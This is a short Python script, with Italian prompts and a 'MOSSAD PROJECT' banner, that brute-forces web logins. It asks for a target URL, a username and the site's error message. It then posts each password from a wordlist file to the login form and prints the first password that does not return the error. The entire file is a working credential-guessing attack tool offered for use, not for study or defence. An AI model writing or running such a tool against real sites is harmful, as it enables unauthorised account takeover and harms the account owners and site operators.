import requests

print("         ***   ***   ***")
print("          *     *     * ")
print("          *     *     * ")
print("          ************* ")
print("               ***      ")
print("               ***      ")
print("               ***      ")
print("               ***      ")
print("              *****     ")
print("")
print("")
print("             MOSSAD PROJECT")
print("")
print("Benvenuto nel nostro programna di bruteforce")
url = input("Inserire l'url bersaglio:")
username = input("Inserire username del bersaglio:")
error = input("Inserire il messaggio d'errore")

try:
	def bruteCracking(username,url,error):
		for password in passwords:
			password = password.strip()
			print("Provando:" + password)
			data_dict = {"username": username, "password": password, "login":"submit"}
			response = requests.post(url, data=data_dict)
			if error in str(response.content):
				pass
			elif "csrf" in str(response.content):
				print("Token individuato! Il bruteforce non ha effetto su questo sito.")
				exit()
			else:
				print("Username: ---> " + username)
				print("Password: ---> " + password)
				exit()
except:
	print("Errore inaspettato, controllare la tua connessione o verificare di avere la versione giusta di python.")

with open("passwords.txt", "r") as passwords:
	bruteCracking(username,url, error)

print("Password non trovata tra le password nella lista inserita")
